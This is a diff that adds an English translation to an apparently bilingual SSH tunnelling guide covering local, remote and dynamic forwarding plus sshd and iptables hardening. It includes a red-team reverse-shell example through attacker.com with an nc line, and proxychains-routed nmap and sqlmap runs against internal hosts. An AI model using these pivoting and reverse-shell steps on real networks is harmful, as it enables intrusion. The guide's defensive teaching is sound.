@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # SSH 터널링 & 포트 포워딩 — 공격과 방어
 
 ## 1. SSH 포워딩 유형
@@ -300,3 +306,141 @@ iptables -A INPUT -p tcp --dport 22 -j DROP
 iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j LOG --log-prefix "SSH-ANOMALY: "
 iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j DROP
 ```
+
+---
+
+<a name="english"></a>
+
+# SSH Tunneling & Port Forwarding — Attack and Defense
+
+## 1. SSH Forwarding Types
+
+```
+SSH Forwarding Methods:
+
+Local Port Forwarding (-L):
+  Your machine → SSH server → Target
+  Use case: Access internal resources from outside
+  Command: ssh -L local_port:target_host:target_port user@ssh_server
+
+Remote Port Forwarding (-R):
+  Target → SSH server → Your machine
+  Use case: Expose internal service to outside (reverse tunnel)
+  Command: ssh -R remote_port:local_host:local_port user@ssh_server
+
+Dynamic Port Forwarding (-D):
+  SOCKS proxy through SSH tunnel
+  Use case: Route all traffic through remote server
+  Command: ssh -D local_port user@ssh_server
+```
+
+---
+
+## 2. Local Port Forwarding Examples
+
+```bash
+# Access internal database from outside
+# Situation: DB server at 192.168.1.100:3306 is only accessible from jump server
+ssh -L 3307:192.168.1.100:3306 user@jump_server.example.com -N
+
+# Now connect locally:
+mysql -h 127.0.0.1 -P 3307 -u admin -p
+
+# Access internal web application
+ssh -L 8080:internal-app.local:80 user@bastion.example.com -N
+# Now browse: http://localhost:8080
+
+# Multiple tunnels at once
+ssh -L 3307:db:3306 -L 8080:web:80 -L 6379:redis:6379 user@bastion -N
+```
+
+---
+
+## 3. Remote Port Forwarding (Reverse Tunnel)
+
+```bash
+# Expose internal service to external server
+# Situation: Internal web server needs to be accessible from internet
+
+# On internal machine:
+ssh -R 8080:localhost:80 user@external.server.com -N
+# Now: http://external.server.com:8080 → your internal :80
+
+# Reverse shell via SSH tunnel (red team use)
+# Attacker's server:
+ssh -R 4444:localhost:4444 user@attacker.com -N
+
+# Victim machine:
+# nc 127.0.0.1 4444 → through tunnel → back to attacker
+
+# Enable GatewayPorts in /etc/ssh/sshd_config for external access:
+# GatewayPorts yes
+```
+
+---
+
+## 4. Dynamic SOCKS Proxy
+
+```bash
+# Create SOCKS5 proxy through SSH
+ssh -D 1080 user@jump_server.example.com -N -f
+
+# Use proxy with tools
+# proxychains4 configuration (/etc/proxychains4.conf):
+# [ProxyList]
+# socks5 127.0.0.1 1080
+
+# Run tools through proxy
+proxychains4 nmap -sT -p 80,443,8080 192.168.1.0/24
+proxychains4 sqlmap -u "http://internal-app.local/page?id=1"
+proxychains4 curl http://internal-resource.local
+
+# Browser proxy settings:
+# Firefox: Settings → Network → SOCKS proxy → 127.0.0.1:1080
+```
+
+---
+
+## 5. SSH Hardening
+
+```bash
+# /etc/ssh/sshd_config hardening
+
+# Disable root login
+PermitRootLogin no
+
+# Disable password authentication (use keys only)
+PasswordAuthentication no
+PubkeyAuthentication yes
+
+# Allow only specific users
+AllowUsers admin devops
+AllowGroups sshusers
+
+# Disable X11 forwarding
+X11Forwarding no
+
+# Disable port forwarding (if not needed)
+AllowTcpForwarding no
+GatewayPorts no
+
+# Use strong ciphers
+Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
+MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
+KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512
+
+# Connection timeout
+ClientAliveInterval 300
+ClientAliveCountMax 2
+LoginGraceTime 30
+MaxAuthTries 3
+```
+
+```bash
+# iptables: Allow only authorized SSH source IPs
+iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j DROP
+
+# Block outgoing SSH connections not from sshd process
+iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j LOG --log-prefix "SSH-ANOMALY: "
+iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j DROP
